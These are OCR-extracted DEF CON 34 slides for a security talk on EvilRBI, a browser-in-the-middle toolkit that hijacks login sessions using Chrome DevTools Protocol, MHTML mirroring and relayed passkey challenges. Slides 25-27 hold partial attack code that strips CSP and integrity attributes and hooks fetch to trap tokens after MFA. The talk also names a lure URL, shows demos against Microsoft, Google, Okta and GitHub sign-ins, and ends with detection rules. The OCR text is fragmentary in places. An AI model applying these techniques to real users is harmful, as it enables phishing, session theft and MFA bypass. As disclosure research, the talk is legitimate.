---
title: "Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking)"
speakers: ["Gregory Disney-Leugers"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Gregory Disney-Leugers - Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking) - 1umberhac.pdf"
pages: 46
sha256: "ce4df736661808a0ec798ffb0464cfc88b50f6e3640fca9aefc7130ddd6fc23c"
text_chars: 23919
ocr_pages: 35
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.8
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:32:42Z"
---
# Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking)

**Speakers:** Gregory Disney-Leugers  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Gregory Disney-Leugers - Reflections on Disregarding Trust (Weaponizing CDP and MHTML for Header-Agnostic Session Hijacking) - 1umberhac.pdf` (46 pages)


## Slide 1

# **REFLECTIONS ON DISREGARDING TRUST**

\```
Weaponization of CDP
and MHTML in Headless Session Hijacking
\```

SPEAKER BRIEFING

\```
Gregory Disney-Leugers
(1umberhack)
\```

## Slide 2


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Follow-up to Reflections on Trusting Trust (1984
THE FOLLOW-UP
Reflections on Trusting Trust - 1984 > runtime - 2026
~10 min
```

## Slide 3

Historical

\```
Forty years in the making
\```

Reflections on Trusting Trust `“The moral is obvious. You can't trust code that you did not totally create yourself. (Especially code from companies that employ people like me.) No amount of source-level verification or scrutiny will protect you from using untrusted code. In demonstrating the possibility of this kind of attack” -` _`Ken Thompson`_

## Slide 4

About the Speaker

\```
Who am I?
\```

Tech lead of offensive security

Developer  of:

- TunnelTug

- Phisheries

- 0TrustCloud

## Slide 5


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pillar 1: Dante's Inferno of Deflected Ownership
The downward migration of security liability:
=
=
=
=
w
n
Ss
=
=)
<
z
S
a
e——— [LAYER 6: PRODUCT DEMAND |]
{
[ LAYER 5: STANDARD EXEMPTIONS ]
[ LAYER 4: CORPORATE CONSUMPTION ]
[ LAYER 3: COMPLEX WRAPPERS ]
[ LAYER 2: THE “SHOULD HAVE KNOWN?” BIAS ]
[ LAYER 1: THE ONUS ON THE USER ]
(The Deepest Pit)
```

## Slide 6

#### THEORETICAL FOUNDATION

\```
Pillar 2: The Law of Generalized Complexity Orchestration
\```

_"As a monolithic system use cases expand, it inevitably introduces features whose combined capabilities achieve functional parity with the underlying execution environment. When orchestrated in unintended ways, they systematically defeat the system's own isolation boundaries."_

## Slide 7

THEORETICAL FOUNDATION

\```
Pillar 3: The Four Constants of Emergent
Vulnerabilities
\```

- **01**<sup>`Modular Vacuum:A component functions`</sup> `flawlessly in isolation.`

- **02**<sup>`Industry Vetting:The mechanism adheres to all`</sup> `established industry standards.`

- **03**<sup>`Security Assumptions:Security posture relies`</sup> `entirely on implicit trust of underlying boundaries.`

- **04**<sup>`Composite Failure:Interaction of multiple`</sup> `vetted components exposes an exploit vector.`

## Slide 8


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
T4 M TAGE
Follow-up to Reflections on Trusting Trust (1984
THE ATTACK
BiITM - one click - no zero-day
~11 min
```

## Slide 9


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AiTM vs BiTM
What sits in the middle — and what gets captured
Session tokens on the stream Real Chrome tab in the middle
Capture / inject cookies on HTTP * Clicks, keys, MFA, session
Victim browser still drives the UI * Victim sees a DOM mirror only
Tools: Evilginx, Modlishka * This talk: EvilRBI
Artifact: Set-Cookie on the wire * Artifact: upstream cookies
EvilIRBI is BITM — victim mirror, chromedp authenticates, session harvest from middle browser.
```

## Slide 10


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Roadmap
Seven steps - one click via TunnelTug
Lure Mirror Relay
dino?url= MHTML DOM input — real
https://provide via WebSocket upstream tab
ONE-CLICK LURE
https://phisheries.dev/dino?url=https://provider
Capture Bypass Harvest
cc =f MFA - FastPass session +
WebAuthn - EV client inventory
AiTM captures sessions on the stream. BiTM captures clicks, keys, MFA in the middle browser. EvilRBI is
BiTM — no Chrome 0-days.
```

## Slide 11

OFFENSIVE ENGINEERING

\```
BitM Demo: Would you like to play a game of Dino?
\```


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ aboutblank x @ chrome://dino/ - Dino game, > Ask Gemin fh RBI Proxy +
@ Amazon.com [i eBay [ij Booking.com: Chea... fj TripAdvisor Facebook
Chrome is being controlled by automated test softwe Restore pages?
. Chrome foothold — 148.@.7778.271 - Windows 11 Version 19.0.@ (64-bit)
Chrome didn't shut d
Press space to play
chrome_mirror: navigation ok despite load error
chrome_mirror: navigation ok despite load error
rbi_session: phase
chrome_mirror: portal armed (local renderer)
chrome_mirror: navigation ok despite load error
chrome_mirror: navigation ok despite load error
Arduino|DE Gregory rbi_client_details: cached
Disney-Leu.. rbi_client_probe: chromewebdata foothold probe c
downstream_rpc: stored publish
vw rbi key relay
A 4 rbi_session: phase
Creatas EV log.html service Taking over log.htm!. Open log.html || Log ALL || Clear
syncing input.
scroll log : page log
```

## Slide 12


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
System Architecture
Victim never talks to EvilRBI directly — the tunnel is the middle
Browser online
Sees a live mirror
TUNNEL
TunnelTug apex
HTTPS = :8879
»| Proxy + chromedp
Holds the session
@ Tunnel terminates TLS — victim only hits the public apex
@ Upstream Chrome holds the real IdP session via CDP
@ No extension install — stock Chrome trust disregarded
Real IdP
Google - Okta - Entra
```

## Slide 13

### **`THE PERFECT CLOAKING DEVICE`**

\```
STRUCTURAL SUPERIORITY OF THE DINO FOOTHOLD (CHROME-ERROR://CHROMEWEBDATA)
\```

#### **`RADIO SILENCE`**

\```
Forcing the browser into the
error state destroys the live
navigation pipeline. Network
timing telemetry, phase-
transition metrics, and
resource load hooks drop to
absolute zero, seamlessly
mimicking a routine local
network timeout.
\```

#### **`ONE-WAY MIRROR`**

\```
As an opaque, display-isolated
scheme, standard web-level
security tooling is completely
blocked from observing the DOM
or execution state. Client-
side scripts are blind, while
high-privilege CDP hooks
retain absolute control.
\```

#### **`STERILE STAGING`**

\```
Modifying API properties live
on a target page trips active
runtime defenses. The Dino
state serves as a sterile
staging ground where an
adversary can silently rewrite
objects and seed canvas
fingerprints in total radio
silence before redirect.
\```

## Slide 14

\```
ARCHITECTURAL CODIFICATION
THE IMMUTABLE LEGACY OF CHROMIUM BUG 703801
\```

\```
The Display-Isolated MandateChromium Bug 703801
officially established chrome-error:// as a display-
isolated scheme to protect internal error states from
external web manipulation.
\```

- **`The Telemetry Asymmetry`** `The engineering fix successfully blocked standard web origins from sniffing or embedding the page, but explicitly preserved high-privilege communication channels (CDP/Extensions).`

- **`The Enforcement Loophole`** `Because the security boundary relies entirely on implicit trust of the underlying execution environment, it creates an asymmetric control plane where the defender is blind, but the automation harness is omniscient.`

## Slide 15


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
T4 M TAGE
Follow-up to Reflections on Trusting Trust (1984
INSIDE THE PIPELINE
Mirror - relay - harvest
~11 min
```

## Slide 16


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mirror Flow
Victim sees a live mirror - real session lives upstream
LURE MIRROR RELAY | AUTH
One click opens MHTML streams Clicks & keys hit MFA upstream
the portal into Shadow DOM real Chrome tab Cookies stay there
Victim action — upstream tab — snapshot — refreshed mirror
Pixel-faithful viewport - real session never leaves chromedp
```

## Slide 17


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Component Map
Foothold = lure > origin > Service Worker
(1) Deploy the proxy
chromedp upstream on :8879 - chromewebdata foothold
One-click lure
TunnelTug apex - /dino?url= points at any https IdP
Confused deputy — portal more privileged than a normal site
Apex Service Worker
Scope /- fetch intercept in privileged V8
(2)
(3) Origin bypass
Part 1 of 2
```

## Slide 18


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Component Map
EV C2 — RPC — mirror ~ MFA harvest Part 2 of 2
6) Built-in EV as C2
offscreen agent : no CRX install required
(6) EV magic RPC
Google's own component bridges cookies, idle, messaging
@ DOM stream
MHTML over WebSocket into Shadow DOM viewport
Relay - MFA - harvest
WebAuthn + FastPass complete upstream - session exported
```

## Slide 19


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ORIGINAL POINTS
01 / SCREENING BYPASS
Firewall proxies attempting to block restricted media types will struggle to
screen them when delivered via the "data" URL scheme.
02 / THE DOMAIN THREAT
Implementers must remain acutely aware of these delivery vectors and
proactively apply whatever precautions are necessary within their domain.
Base64 URI: Security was considered (RFC 2397)
Sites which use firewall proxies to disallow the retrieval of certain media
types (such as application script languages or types with known security
problems) will find it difficult to screen against the inclusion of such types
using the "data" URL scheme. However, they should be aware of the threat
and take whatever precautions are considered necessary within their
domain.
The effect of using long "data" URLs in applications is currently unknown;
some software packages may exhibit unreasonable behavior when
confronted with data that exceeds its allocated buffer size.
97 + The “data cheme + August 1
```

## Slide 20


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MHTML: An archaic warning (RFC 2557)
ORIGINAL POINTS
01 / LOCAL RESOLUTION 02 / THE TROJAN HORSE 03 / BOUNDARY RESTRICTION
Standards force all internal HTML URIs to resolve strictly If an MHTML resource leaks into the general web cache, it can Cached MHTML resources must never be accessible outside
within the local MHTML structure, completely isolating them act as a Trojan Horse to inject completely misrepresented or their specific multipart structure, explicitly preventing origin
from external network sources. spoofed web assets into the browser. confusion and broad cache poisoning.
When processing (rendering) a text/html body part in an MHTML multipart/related structure, all URIs in that text/html body part which reference subsidiary
resources within the same multipart/related structure SHALL be satisfied by those resources and not by resources from any another local or remote source.
Failure to honor this directive will allow a multipart/related structure to be employed as a Trojan Horse. For example, to inject bogus resources (i.e. a
misrepresentation of a competitor's Web site) into a recipient's generally accessible Web cache.
RFC 2557 - MIME Encapsulation of Aggregate Documen March 1
```

## Slide 21

#### EXPLOIT MECHANICS

\```
chrome.PageCapture: Please don't rehydrate
mhtml
\```


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
chrome.PageCapture: Please don't rehydrate
mhtml
chrome.pageCapture - « -
Use the chrome.pageCapture API to save a tab as MHTML.
MHTML is a standard format supported by most browsers. It encapsulates in a single file a page and all its resources
(CSS files, images..).
Note that for security reasons a MHTML file can only be loaded from the file system and that it can only be loaded in the
main frame.
```

## Slide 22

#### EXPLOIT MECHANICS

## `The Magic Phrase: Living off of Google EV`

##### CRITICAL BYPASS MECHANICS

- `Mojo RPC Key: The key is utilized to initiate RPC communication over Mojo for Google EV.`

- `Sandbox Integrity: Not considered a vulnerability because it operates without extension-level privilege, leaving the browser sandbox entirely unimpacted.`

- `Offscreen Script: Used to execute a custom offscreen_script.js for trusted Mojo-based communication with a component extension.`

- `Built-in to Chrome as component extension.`

## Slide 23

#### EXPLOIT MECHANICS

## `Using the Magic Phrase: Drive By Magic Worker`

##### CRITICAL BYPASS MECHANICS

- `Mojo RPC Key: The key is utilized to initiate RPC communication over Mojo for Google EV.`

- `Extension Level Communication: The background_service_worker.js privileged with Mojo access and the perfect pipe to stream websocket traffic for DOM, keystroke, click captures.`

- `Offscreen Script: We leverage the EV key to use service workers to communicate with background_service_worker.js via our custom offscreen_script.js.`

## Slide 24


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Browser-in-t
ct
lis an intended API
ick. Each «
page.CaptureSnapshot
format = MHTML
server-side Chrome tab
scripts already executed
post-render live DOM
he-Middle : Three Primitives
2 -MHTML } Data URI
parse multipart MHTML
inline every asset
data:...;base64,...
strip CSP / SRI / nonce
header-agnostic mirror
hook fetch + XHR
proxy IdP API calls
post-MFA token path
Okta - MS + Google - Shib
session stays upstream
```

## Slide 25


> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1edp holds the real IdP tab - legitimate scripts already ran
var rawMHTML string
err := chromedp.Run(tabCtx,
chromedp.ActionFunc(func(ctx context.Context) error {
var err error
rawMHTML, err = page.CaptureSnapshot()
-Do(ctx)
return err
rawHTML, assets, err := parseMHTMLSnapshot(
strings .NewReader (rawMHTML ) )
cache.ingest(assets)
best := bestOfflineHTML(rawHTML, cache.assets, pageURL)
htmlStr := hydrateSnapshotHTML(string(best), cache.assets)
out := prepareStageHTML([]byte(htmlStr), pageURL)
```

## Slide 26


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Base64 data URIs - strip integrity / CSP ned live DOM
func sanitizeHTMLFragment(html string) string { function Seraeeeml | = {
html = cspRe.ReplaceAllString(html, "") return String(html || ""
html = sandboxAttrRe.ReplaceAllString(html, "") -replace(/\s+sandbox(?:=...)/gi, "")
html = nonceRe.ReplaceAllString(html, "") -replace(/\s+nonce=[‘"][*'"]+['"]/gi, "“")
html = integrityRe.ReplaceAllstring(html, "") -replace(/\s+integrity=['"][*'"]+['"]/gi, "")
html = crossoriginRe.ReplaceAllString(html, -replace(/\s+crossorigin=['"][*'"]+['"]/gi,
return html }
}
function assetDataURI(mediaType, bytes) {
let mt = String(mediaType || “application/octet-stream")
func assetDataURI(a MHTMLAsset) string { -split(";")[@].trim();
mt := normalizeDataURIMediaType(a.MediaType) return “data:${mt};base64, ${bytesToB64(bytes)}°
return fmt.Sprintf("data:%s;base64,%s", }
mt, base64.StdEncoding.EncodeToString(a.Data) )
}
func hydrateSnapshotHTML(html string, // BiTM never rewrites the wire —
assets map[string]MHTMLAsset) string { // it serves a self-contained live DOM.
urlMap := buildURLAssetLookup(assets)
html = sanitizeHTMLFragment(htm1) // SRI checks nothing when every asset is inline.
html = replaceURLMap(html, urlMap) // = data: // CSP never binds the attacker mirror origin.
return resolveCIDInHTML(html, buildCIDLookup(assets) )
```

## Slide 27


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a JavaScript Shim — HESS ‘MFA Harvest
(function (
fetch_shim,js - hook fetch/XHR - trap tokens after MFA
im.js + ful
if (window.__RBI_AUTH_FETCH_SHIM__) return;
window.
__RBI_AUTH_FETCH_SHIM__ = true;
var PROXY = "/api/rbi/upstream-fetch" ;
function
return
|| h
|| h
|| h
|| h
I| /s
}
var origF
window. fe
var url =
if (!sh
url =P
init =
crede
return
isAuthUpstreamHost(hostname) {
String(hostname || "").toLowerCase();
h.endsWith(".okta.com")
.endsWith(".microsoftonline.com")
-endsWith(".google.com")
-endsWith(". live.com")
hibboleth|sso\./i.test(h);
etch = window. fetch. bind(window) ;
tch = function (input, init) {
ROXY + "“?url=" + encodeURIComponent(absURL(url));
Object.assign({}, init || {}, {
ntials: "“same-origin", mode: "cors"
origFetch(url, init); // response / tokens via upstream
typeof input === "string" ? input : input.url;
ouldProxy(url)) return origFetch(input, init);
```

## Slide 28


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Architecture — Communication
Every arrow is an intended API - no Chrome zero-day
Mirror viewport
Clicks & keys out
Passkey / FastPass
Real auth session
Stream sync hub
viewport + input
» Input relay
MFA + EV bridges
Built-in component
UPSTREAM
@ Real IdP tab
okies
@ MHTML snapshots
@ Session cookies
MS - GitHub - passkeys.io
Upstream — IdP - victim borrows EV - WebAuthn on victim device
```

## Slide 29


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Internet Exposure via TunnelTug
Apex HTTPS = localhost:8879 - single-click lure
@) ©
CLICK TUNNEL
Victim opens TunnelTug
/dino?url=|ldP HTTPS — :8879
OPERATOR SETUP
* proxy.exe --prod
* tunneltug -prod -routing direct
* public_url matches apex
BiTM . BROWSER
EvilRBI proxy Mirrored IdP
mirror + relay + built-in EV
https://phisheries.dev/dino?urle-...
Any https IdP on /dino - one click on the internet
```

## Slide 30


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WebAuthn — The Problem
Passkeys bind to origin + device - BITM splits them
Attacker Chrome Victim only sees Origin must match
runs the real IdP a cloned viewport the real IdP
Challenge issued Can't complete WebAuthn Wrong origin =
here — no key on the lure origin IdP rejects
You cannot complete a passkey on the wrong machine with the wrong origin.
```

## Slide 31


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WebAuthn — The Relay
Victim signs - middle browser gets the session
CHALLENGE RELAY SIGN WIN
IdP asks for Proxy ships Victim signs at Assertion returns
passkey upstream options to victim true RP origin Cookies upstream
Microsoft - GitHub - passkeys.io - Entra: Google
```

## Slide 32


> Recovered by OCR — confidence 95/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WebAuthn — Why It Works
Origin check passes - authenticator is real - session upstream
ORIGIN AUTHENTICATOR SESSION
Temp tab at the Victim's real Cookies land on
true RP origin passkey signs attacker Chrome
“Passkeys stop phishing” fails when the challenge is issued to an attacker session.
```

## Slide 33


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
T4 M TAGE
Follow-up to Reflections on Trusting Trust (1984
PROOF
5 demos: ~1 min each
~5 min
```

## Slide 34

Demo
Demo: Mircosoft


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ aboutblank x HE Signin to your account
a a B Windows PowerShel X @% Attach phisheriesde X 28 WindowsPow viewer browser — 150.0.4078.48 (Official build) (64-bit) - Windows 11 Version 19.0.0 (64-bit)
rome is
RBI Proxy :8879 | mirror=rbi | dev/headed |
TYPE REMOTE TARGET TIME kK]
viewer 127.0.0.1:64895 https://login.mi..15:40:27
15:4 a
B® Microsoft
ev_rpc: stub relay Sign in
ev_rpc: stub relay
ev_rpc: stub relay Ema
ev_rpc: stub relay
ev_rpc: stub relay
downstream_rpc: stored publish
downstream_rpc: stored publish
downstream_rpc: stored publish
ev_rpc: stub relay
ev_rpc: stub relay Next
ev_rpc: stub relay
downstream_rpc: stored publish
proxy_pipeline: Capturing from shared upst
downstream_rpc: stored publish
chrome_mirror: navigation ok despite load
upstream_action: Navigating shared tab Qy Sign-in options
No account? Create
> quit : scroll log : page lc
Terms of use Privacy & coo
```

## Slide 35

Demo

Demo: Google


> Recovered by OCR — confidence 83/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| ¥ @ aboutblank x © Sian in - Goggle Accounts _ + fh REI Proxy + Q _ 0 xX
Chrome is being controlled by automated test software
Viewer browser — 148.0.7778.271 - Windows 11 Version 19.0.0 (64-bit)
17
BY Windows PowerShell X BB Windows PowerShell x + v
E RBI Proxy :8080 | mirror=rbi | dev/headed | chrome=- Sign in Email or phone
( TYPE REMOTE TARGET TIME KIND URL
09:38:44 https with your Google Account. This account
4 will be available to other Google apps in Forgot email? gregory.disney.leugers@gmail.com
E the browser.
M gregory.disney@owasp.org
Ede Not your computer : Use Guest mioue vo sign in
(=) privately. Learn more about using Guest mode
auth_debug: stage_prepare Create account
auth_debug: mirror_capture
rbi_session: phase
auth_debug: mirror_pushed
u {4 rbi_mirror: chromedp auth viewport pushed
auth_debug: stage_prepare
C auth_debug: mirror_capture
auth_debug: mirror_push_skip
auth_debug: stage_prepare
auth_debug: mirror_capture
!7 auth_debug: mirror_capture ro)
cs auth_debug: mirror_push_skip
F auth_debug: mirror_settle_done ©
bal rbi_mirror: auth viewport pushed
bertbin DEFCON & |
Create / quit : scroll log : page log = English (United States) ~ Help Privacy Terms
Heat watch =] md) ea 2394 ¢
```

## Slide 36

Demo
Demo: Okta


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
about:blank owasp-trial-2096971-Signin fh RBI Proxy +
Amazon.com eBay [ij Booking.com: Cheap... fj TripAdvisor Facebook
Chrome is being controlled by automated test software
Viewer browser — 149.0.7827.197 - Windows 11 Version 19.0.0 (64-bit)
U c oom wy,
Sign in with your account to acc
Connecting to
Sign in with your account to ac:
Okta Dashboard
Okta Dashboard
okta okta
Username Sign In
gregory.disney@owasp.org Username
gregory.disney@owasp.org
Keep me signed in
Privacy F
Sunny
Q Search
```

## Slide 37

Demo
Demo: AWS


> Recovered by OCR — confidence 72/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
_.. Amazon.com [fj eBay [fy Booking.com: Cheap... fj TripAdvisor Jj Facebook
i Chrome is being controlled by automated test software ~s && bey & 9. pf Trip b
Local application is not running.
PS
PS
20:
20
20 =)
9
J :
be a
```

## Slide 38

Demo

Demo: Github


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GDL
@ aboutblank
x ©) Signin to GitHub - GitHub x +
github.com/login
Chrome is being controlled by automated test software
©
Sign in to GitHub
Username or email address
Password
Sign in
or
G Continue with Google
@ Continue with Apple
New to GitHub?
fh RBI Proxy +
Viewer browser — 149..7827.201 - Windows 11 Version 19.0.0 (64-bit)
©)
Sign in to GitHub
Username or email address
Password
Sign in
or
G Continue with Google
@ Continue with Apple
New to GitHub?
```

## Slide 39


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Follow-up to Reflections on Trusting Trust (1984
DISREGARDING TRUST
Thompson's question - runtime scale - exit
~8 min
```

## Slide 40

Demo

DBSC: A Total Eclipse of the Identity


> Recovered by OCR — confidence 75/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Viewer browser - 149.0.4022.98 (Official build) (64-bit) - Windows 11 Version 19.0.0 (64-bit)
ie]
Chrome is being controlled by automated test software
Storage Preserve log
& exten... Type Date Result
© index... Creation | 7/3/20... Error
>» © Cooki. Creation 7/3/20... Error
Creation 7/3/20... Error
er , = se Creation 7/3/20... Error OTrust.Cloud
Creation 7/3/20... Error
ERGs Creation 7/3/20... Error
OTrust.Cloud renee Creation 7/3/20... Error
Creation | 7/3/20... Error
= a Creation 7/3/20... Error admin_4
= O Notifi Creation | 7/3/20... Error
& Paym... Creation 7/3/20... Error tor f
© perio... Creation | 7/3/20... Error W
> I> Spec... Event details
Register Passkey O Pash . Site h
> LD) Repor... p
> & Devic... Ii
AN ;
Frames 4
> DC top Session ID
a ee @4 Passkey step — use your passkey or click Try another way
Thunderstorm st...
® inettect Q Search
```

## Slide 41

#### EXPLOIT MECHANICS

\```
DBSC: Will not protect registration
\```


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DBSC: Will not protect registration
2.1. Non-goals
DBSC will not prevent temporary access to the browser session while the attacker is resident on the user’s
device. The private key should be stored as safely as modern operating systems allow, preventing exfiltration of
the session private key, but the signing capability will likely still be available for any program running as the user
on the user’s device.
DBSC will also not prevent an attack if the attacker is replacing or injecting into the user agent at the time of
session registration, as the attacker can bind the session either to keys that are not TPM bound, or to a TPM that
the attacker controls permanently.
DBSC is not designed to give hosts any sort of guarantee about the specific device a session is registered to, or
the state of this device.
```

## Slide 42

EXPLOIT MECHANICS

\```
Webauthn: Also will not protect registration
\```


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Webauthn: Also will not protect registration
13.4.4. Attestation Limitations
This section is not normative.
When registering a new credential, the attestation statement, if present, may allow the WebAuthn Relying Party
to derive assurances about various authenticator qualities. For example, the authenticator model, or how it stores
and protects credential private keys. However, it is important to note that an attestation statement, on its own,
provides no means for a Relying Party to verify that an attestation object was generated by the authenticator the
user intended, and not by a man-in-the-middle attacker. For example, such an attacker could use malicious code
injected into Relying Party script. The Relying Party must therefore rely on other means, e.g., TLS and related
technologies, to protect the attestation object from man-in-the-middle attacks.
Under the assumption that a ceremony is completed securely, and that the authenticator maintains
confidentiality of the credential private key, subsequent authentication ceremonies using that public key
credential are resistant to tampering by man-in-the-middle attacks.
```

## Slide 43


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
EvilRBI.Phisheries — what actually fires
rt Id ily uil
heries r 1
EvilRBI.Phisheries — virtual authenticator (client)
WebAuthn registration with null/software AAGUID
CDP virtual authenticator / BiITM Path B
rule_evilrbi_virtual_authenti roe t irtual_authenticat null aaguid zuid=00000000
EvilRBI.Phisheries — new DBSC device after login
new_dbsc_device « hardware session binding registered
BiTM binds DBSC to attacker Chrome — IdP sees a new device
KEY LINE
You don't catch the middle browser on the wire.
You catch virtual-auth AAGUID on register — and the new DBSC device it left behind.
```

## Slide 44


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A follow-up to Reflections on Trusting Trust - 1984
The Moral is Obvious. You cannot trust a runtime that you do not own and understand yourself. Modern defense mechanisms
attempt to enforce security on top of layers of massive, opaque, multi-million-line monolithic engines controlled by third
parties. When you rely on an ecosystem you do not fundamentally manage, any boundary you draw is merely an illusion of
safety. Ultimately, your security posture is entirely at the mercy of the underlying execution environment's emergent
complexity. No amount of cryptographic boundaries or layered complexity can cure this foundational weakness.
```

## Slide 45

DEFENSIVE BLUEPRINT `Tool Repos`

\```
TunnelTug
EvilRBI (Phisheries)
https://github.com/Tunne
https://github.com/EvilR
lTug/TunnelTug
BI/phisheries
https://tunneltug.com
https://evilrbi.com
\```

## Slide 46

QA `QA`

\```
Defcon.Chat
\```

\```
Channel:#qa-reflections_on_disregarding_trust
Handle: @1umberhack
\```
